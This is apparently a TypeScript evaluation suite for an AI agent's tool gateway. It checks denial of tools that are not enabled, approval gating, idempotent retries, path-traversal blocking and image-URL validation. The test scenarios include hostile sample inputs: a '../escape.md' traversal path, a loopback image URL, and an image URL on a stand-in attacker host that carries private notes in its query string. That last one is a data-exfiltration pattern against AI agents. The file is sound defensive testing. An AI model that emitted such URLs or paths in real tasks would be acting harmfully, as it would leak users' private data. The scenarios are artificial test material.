import { expect } from "vitest";
import { createJudge, describeEval } from "vitest-evals";
import {
  toolGatewayHarness,
  type ToolGatewayEvalInput,
  type ToolGatewayEvalOutput,
} from "./harness/tool-gateway-harness";

const PolicyContractJudge = createJudge<ToolGatewayEvalInput, ToolGatewayEvalOutput>(
  "PolicyContract",
  ({ input, output }) => {
    const failures: string[] = [];
    for (const [key, expected] of Object.entries(input.expected)) {
      if (key === "errorIncludes") {
        if (!output.error?.includes(String(expected))) {
          failures.push(`error did not include ${JSON.stringify(expected)}`);
        }
        continue;
      }
      const actual = output[key as keyof ToolGatewayEvalOutput];
      if (actual !== expected) {
        failures.push(`${key}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
      }
    }
    return {
      score: failures.length === 0 ? 1 : 0,
      metadata: {
        rationale: failures.length === 0 ? "Policy contract satisfied" : failures.join("; "),
      },
    };
  },
);

const emailArguments = {
  to: "recipient@example.test",
  subject: "Controlled delivery",
  body: "This message must remain approval-gated.",
};

const scheduleArguments = {
  name: "Monday review",
  scheduleType: "cron",
  cronExpression: "0 9 * * 1",
  timezone: "UTC",
  taskTemplate: {
    title: "Review operations",
    input: "Review the latest operations status.",
  },
  enabled: true,
};

const scenarios: ToolGatewayEvalInput[] = [
  {
    name: "denies a tool that is not enabled",
    toolName: "files.write",
    arguments: { path: "report.md", content: "blocked" },
    enabledTools: [],
    expected: {
      responseKind: "denied",
      toolStatus: "DENIED",
      artifactCount: 0,
    },
  },
  {
    name: "enforces an explicit denied policy",
    toolName: "email.send",
    arguments: emailArguments,
    policy: "denied",
    expected: {
      responseKind: "denied",
      toolStatus: "DENIED",
      outboxCount: 0,
    },
  },
  {
    name: "blocks workspace path traversal",
    toolName: "files.write",
    arguments: { path: "../escape.md", content: "blocked" },
    policy: "automatic",
    expected: {
      responseKind: "error",
      toolStatus: "FAILED",
      artifactCount: 0,
      errorIncludes: "Path traversal",
    },
  },
  {
    name: "rejects an incomplete recurring schedule before approval",
    toolName: "schedules.create",
    arguments: {
      name: "Invalid recurrence",
      scheduleType: "cron",
      timezone: "UTC",
      taskTemplate: { title: "Review", input: "Review status." },
    },
    policy: "approval",
    expected: {
      responseKind: "denied",
      toolStatus: "DENIED",
      approvalStatus: null,
      scheduleCount: 0,
    },
  },
  {
    name: "does not create a schedule while approval is pending",
    toolName: "schedules.create",
    arguments: scheduleArguments,
    policy: "approval",
    decision: "none",
    expected: {
      responseKind: "approval",
      toolStatus: "WAITING_FOR_APPROVAL",
      approvalStatus: "PENDING",
      scheduleCount: 0,
    },
  },
  {
    name: "does not send email after approval rejection",
    toolName: "email.send",
    arguments: emailArguments,
    policy: "approval",
    decision: "reject",
    expected: {
      responseKind: "approval",
      approvalStatus: "REJECTED",
      outboxCount: 0,
      executionCount: 1,
    },
  },
  {
    name: "executes an approved email exactly once across retries",
    toolName: "email.send",
    arguments: emailArguments,
    policy: "approval",
    decision: "approve",
    executeRepeats: 2,
    expected: {
      responseKind: "approval",
      approvalStatus: "APPROVED",
      toolStatus: "COMPLETED",
      outboxCount: 1,
      executionCount: 2,
      repeatResultsEqual: true,
    },
  },
  {
    name: "creates one schedule across idempotent approval retries",
    toolName: "schedules.create",
    arguments: scheduleArguments,
    policy: "approval",
    decision: "approve",
    executeRepeats: 2,
    expected: {
      responseKind: "approval",
      approvalStatus: "APPROVED",
      toolStatus: "COMPLETED",
      scheduleCount: 1,
      executionCount: 2,
      repeatResultsEqual: true,
    },
  },
  {
    name: "denies image attachment when no skill enables it",
    toolName: "chat.attach_images",
    arguments: { images: [{ url: "https://cdn.example.com/villa.jpg", alt: "Villa" }] },
    enabledTools: [],
    expected: {
      responseKind: "denied",
      toolStatus: "DENIED",
    },
  },
  {
    name: "refuses to attach an image no tool returned",
    toolName: "chat.attach_images",
    arguments: {
      images: [{ url: "https://attacker.example.net/pixel.gif?notes=private", alt: "Invented" }],
    },
    policy: "automatic",
    expected: {
      responseKind: "error",
      toolStatus: "FAILED",
      errorIncludes: "Not an image returned by a tool in this task",
    },
  },
  {
    name: "refuses a non-HTTPS or local image address",
    toolName: "chat.attach_images",
    arguments: { images: [{ url: "http://127.0.0.1:8080/private.png", alt: "Local" }] },
    policy: "automatic",
    expected: {
      responseKind: "error",
      toolStatus: "FAILED",
      errorIncludes: "Not a public HTTPS image URL",
    },
  },
];

describeEval(
  "controlled tool safety",
  {
    harness: toolGatewayHarness,
    judges: [PolicyContractJudge],
    judgeThreshold: 1,
  },
  (it) => {
    it.for(scenarios)("$name", async (scenario, { run }) => {
      const result = await run(scenario);
      if (scenario.expected.responseKind === "error") {
        expect(result.output.error).toBeTruthy();
      } else {
        expect(result.output.responseKind).not.toBe("error");
      }
    });
  },
);
